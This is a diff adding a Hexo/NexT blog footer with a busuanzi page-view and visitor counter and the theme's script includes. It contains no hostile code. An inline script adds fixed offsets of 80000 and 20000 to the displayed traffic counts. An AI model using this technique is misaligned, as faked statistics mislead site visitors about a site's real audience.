+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+#running-time
+
+<script>
+    $(document).ready(function () {
+
+        var int = setInterval(fixCount, 50);  // 50ms周期检测函数
+        var pvcountOffset = 80000;  // 初始化首次数据
+        var uvcountOffset = 20000;
+
+        function fixCount() {
+            if (document.getElementById("busuanzi_container_site_pv").style.display != "none") {
+                $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + pvcountOffset);
+                clearInterval(int);
+            }
+            if ($("#busuanzi_container_site_pv").css("display") != "none") {
+                $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + uvcountOffset); // 加上初始数据 
+                clearInterval(int); // 停止检测
+            }
+        }
+    });
+</script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
